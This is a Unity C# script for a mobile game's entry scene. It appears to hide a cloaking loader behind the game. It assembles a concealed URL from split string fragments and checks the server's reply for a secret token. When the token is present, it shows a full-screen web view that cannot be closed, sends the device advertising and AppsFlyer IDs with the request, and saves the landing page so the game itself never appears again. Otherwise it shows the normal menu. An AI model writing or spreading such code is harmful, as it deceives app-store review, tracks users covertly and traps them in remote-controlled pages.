using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainMM : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oMMNa = "";
    [HideInInspector] public string tMMNa = "";

    

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaMM") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oMMNa = advertisingId; });
        }
    }
    

    

   

    private void NETMMWATCH(string UrlMMlink, string NamingMM = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _ssylkiMM = gameObject.AddComponent<UniWebView>();
        _ssylkiMM.SetToolbarDoneButtonText("");
        switch (NamingMM)
        {
            case "0":
                _ssylkiMM.SetShowToolbar(true, false, false, true);
                break;
            default:
                _ssylkiMM.SetShowToolbar(false);
                break;
        }
        _ssylkiMM.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _ssylkiMM.OnShouldClose += (view) =>
        {
            return false;
        };
        _ssylkiMM.SetSupportMultipleWindows(true);
        _ssylkiMM.SetAllowBackForwardNavigationGestures(true);
        _ssylkiMM.OnMultipleWindowOpened += (view, windowId) =>
        {
            _ssylkiMM.SetShowToolbar(true);

        };
        _ssylkiMM.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingMM)
            {
                case "0":
                    _ssylkiMM.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _ssylkiMM.SetShowToolbar(false);
                    break;
            }
        };
        _ssylkiMM.OnOrientationChanged += (view, orientation) =>
        {
            _ssylkiMM.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _ssylkiMM.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlMMlink", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlMMlink", url);
            }
        };
        _ssylkiMM.Load(UrlMMlink);
        _ssylkiMM.Show();
    }

    private IEnumerator IENUMENATORMM()
    {
        using (UnityWebRequest mm = UnityWebRequest.Get(tMMNa))
        {

            yield return mm.SendWebRequest();
            if (mm.isNetworkError)
            {
                GoMM();
            }
            int skimMM = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && skimMM > 0)
            {
                yield return new WaitForSeconds(1);
                skimMM--;
            }
            try
            {
                if (mm.result == UnityWebRequest.Result.Success)
                {
                    if (mm.downloadHandler.text.Contains("MrshmllwmnjKHxGeED"))
                    {

                        try
                        {
                            var subs = mm.downloadHandler.text.Split('|');
                            NETMMWATCH(subs[0] + "?idfa=" + oMMNa, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            NETMMWATCH(mm.downloadHandler.text + "?idfa=" + oMMNa + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        GoMM();
                    }
                }
                else
                {
                    GoMM();
                }
            }
            catch
            {
                GoMM();
            }
        }
    }



    private void GoMM()
    {
        Screen.orientation = ScreenOrientation.LandscapeLeft;
        SceneManager.LoadScene("Menu");
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlMMlink", string.Empty) != string.Empty)
            {
                NETMMWATCH(PlayerPrefs.GetString("UrlMMlink"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    tMMNa += n;
                }
                StartCoroutine(IENUMENATORMM());
            }
        }
        else
        {
            GoMM();
        }
    }
}
